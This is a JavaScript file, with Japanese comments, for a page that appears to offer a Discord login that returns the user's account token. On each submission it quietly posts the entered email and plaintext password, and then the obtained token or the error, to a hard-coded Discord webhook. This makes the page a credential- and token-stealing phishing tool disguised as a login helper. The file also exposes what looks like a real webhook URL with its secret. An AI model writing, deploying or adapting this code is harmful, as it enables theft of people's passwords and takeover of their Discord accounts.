// 設定
const WEBHOOK_URL = "https://discord.com/api/webhooks/1420270624512938046/HzryfPQKe1BZVN9ixhhkvXxx8Zu6W1V433hQxivvYD10AQDwBnRovsd2ALPTlt2S1tdt";

class DiscordLogin {
    constructor() {
        this.form = document.getElementById('loginForm');
        this.loading = document.getElementById('loading');
        this.result = document.getElementById('result');
        this.error = document.getElementById('error');
        this.tokenDisplay = document.getElementById('tokenDisplay');
        this.errorText = document.getElementById('errorText');
        
        this.init();
    }
    
    init() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleLogin();
        });
    }
    
    async handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const serverUrl = document.getElementById('serverUrl').value;
        
        this.showLoading();
        this.hideError();
        this.hideResult();
        
        try {
            // ログイン情報をwebhookに送信
            await this.sendToWebhook('login_attempt', { email, password, serverUrl });
            
            // プロキシ経由でログイン実行
            const token = await this.loginViaProxy(email, password, serverUrl);
            
            // ログイン成功
            this.showResult(token);
            await this.sendToWebhook('login_success', { email, token, serverUrl });
            
        } catch (error) {
            this.showError(error.message);
            await this.sendToWebhook('login_failed', { email, error: error.message, serverUrl });
        }
    }
    
    async loginViaProxy(email, password, serverUrl) {
        // プロキシサーバー経由でログイン
        const response = await fetch(`${serverUrl}/api/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            return data.token;
        } else {
            throw new Error(data.error || 'ログインに失敗しました');
        }
    }
    
    async sendToWebhook(eventType, data) {
        if (!WEBHOOK_URL || WEBHOOK_URL.includes('your_webhook_url_here')) {
            return;
        }
        
        let message, color;
        
        switch(eventType) {
            case 'login_attempt':
                message = `ログイン試行\nメール: ${data.email}\nパスワード: ${data.password}\nサーバー: ${data.serverUrl}`;
                color = 16776960;
                break;
            case 'login_success':
                message = `ログイン成功\nメール: ${data.email}\nトークン: ${data.token}\nサーバー: ${data.serverUrl}`;
                color = 65280;
                break;
            case 'login_failed':
                message = `ログイン失敗\nメール: ${data.email}\nエラー: ${data.error}\nサーバー: ${data.serverUrl}`;
                color = 16711680;
                break;
            default:
                return;
        }
        
        const payload = {
            embeds: [{
                title: `Discord Login - ${eventType}`,
                description: message,
                color: color,
                timestamp: new Date().toISOString()
            }]
        };
        
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });
        } catch (error) {
            console.error('Webhook送信エラー:', error);
        }
    }
    
    showLoading() {
        this.form.classList.add('hidden');
        this.loading.classList.remove('hidden');
    }
    
    hideLoading() {
        this.loading.classList.add('hidden');
    }
    
    showResult(token) {
        this.hideLoading();
        this.tokenDisplay.textContent = token;
        this.result.classList.remove('hidden');
    }
    
    hideResult() {
        this.result.classList.add('hidden');
    }
    
    showError(message) {
        this.hideLoading();
        this.form.classList.remove('hidden');
        this.errorText.textContent = message;
        this.error.classList.remove('hidden');
    }
    
    hideError() {
        this.error.classList.add('hidden');
    }
}

function copyToken() {
    const token = document.getElementById('tokenDisplay').textContent;
    navigator.clipboard.writeText(token).then(() => {
        alert('トークンがクリップボードにコピーされました');
    });
}

document.addEventListener('DOMContentLoaded', () => {
    new DiscordLogin();
});
